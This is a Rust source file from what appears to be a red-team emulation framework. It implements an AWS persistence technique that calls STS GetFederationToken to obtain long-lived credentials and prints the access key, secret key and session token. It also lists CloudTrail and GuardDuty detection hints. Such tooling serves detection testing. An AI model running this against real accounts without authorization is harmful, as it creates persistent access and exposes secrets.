use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

async fn detonate_impl(_outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;

    let result = aws.sts
        .get_federation_token()
        .name("StratusRedTeamFederationToken")
        .duration_seconds(3600)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    if let Some(creds) = result.credentials() {
        println!(
            "Obtained federation token credentials:\n  AccessKeyId: {}\n  SecretAccessKey: {}\n  SessionToken: {}\n  Expiration: {:?}",
            creds.access_key_id(),
            creds.secret_access_key(),
            creds.session_token(),
            creds.expiration()
        );
    }

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.persistence.sts-federation-token",
        friendly_name: "Retrieve a set of long-lived credentials using STS GetFederationToken",
        description: "Calls STS GetFederationToken to obtain long-lived credentials (up to 36 hours) usable outside of the current AWS account context for persistence.",
        detection: "CloudTrail: GetFederationToken. GuardDuty: Policy:IAMUser/AnomalousBehavior.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Persistence],
        is_idempotent: true,
        is_slow: false,
        prerequisite_tf: None,
        detonate,
        revert: None,
    }
}
